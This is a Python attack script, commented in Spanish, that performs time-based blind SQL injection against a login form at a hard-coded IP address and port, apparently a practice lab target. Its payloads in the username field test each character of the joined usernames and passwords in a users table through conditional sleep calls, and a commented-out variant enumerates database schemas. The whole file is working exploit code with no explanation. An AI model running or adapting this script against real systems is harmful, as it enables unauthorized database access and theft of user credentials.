import requests
import sys
import signal
import string
import time
from pwn import *

# Variables globales
mainUrl = "http://94.237.63.132:45850"
# characters = string.printable

def def_handler(sig, frame):
  print("\n[!] Saliendo...\n")
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def injectSqlQuery():
  # "username": "admin' and sleep(5)-- -",
  statusLog = log.progress("Fuerza bruta")
  statusLog.status("Iniciando proceso de fuerza bruta...")

  time.sleep(2)

  dataLog = log.progress("Datos obtenidos")

  extractedInfo = ""

  for position in range(1, 70):
    for character in range(33, 126):
      sqlQuery = f"""admin' and if(ascii(substr((SELECT GROUP_CONCAT(username,0x3a,password) FROM users), {position}, 1)) = {character}, sleep(1), 0)-- - """
      statusLog.status(f"Position -> {position} | Character -> {character}")

      postData = {
        # "username": f"admin' and if(ascii(substr((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),{position},1))={character}, sleep(1))-- -",
        "username": sqlQuery,
        "password": "test"
      }

      timeStart = time.time()

      response = requests.post(mainUrl, data=postData)

      timeEnd = time.time()

      if timeEnd - timeStart > 1:
        extractedInfo += chr(character)
        dataLog.status(extractedInfo)
        break

  # print(response.text)

if __name__ == '__main__':
  injectSqlQuery()
